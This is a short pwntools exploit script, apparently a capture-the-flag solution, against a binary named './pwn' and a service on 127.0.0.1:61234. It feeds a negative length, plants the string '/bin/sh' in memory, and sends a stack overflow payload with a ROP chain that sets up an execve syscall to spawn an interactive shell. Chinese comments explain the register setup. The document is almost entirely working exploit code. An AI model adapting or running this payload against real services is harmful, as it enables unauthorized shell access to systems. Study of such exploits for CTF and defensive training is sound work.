from pwn import *

context(arch='amd64',os='linux',log_level='debug',endian='little')

p = process('./pwn')
p = remote('127.0.0.1',61234)

p.recvuntil(b'de\n')
p.sendline(b'-32')
p.recvuntil(b'rd\n')

# print('pid'+str(proc.pidof(p)))
# pause()

# 如果写p64的话会因为超过read读取范围导致下一次在cheat函数中read直接调用不再需要输入
p.send(p32(0x3b)+b'/bin/sh\x00')
p.recvuntil(b'de.\n')

binsh = 0x404084
rax = 0x401244
rdi = 0x401240
syscall = 0x401230
# 64位 system syscall: rax=0x3b(调用号) rdi='/bin/sh/x00' rsi=0 rdx=0
payload = b'a'*(0x40+8) + p64(rdi) + p64(binsh) + p64(0) + p64(0) + p64(rax) + p64(0x3b) + p64(syscall)
p.send(payload)

p.interactive()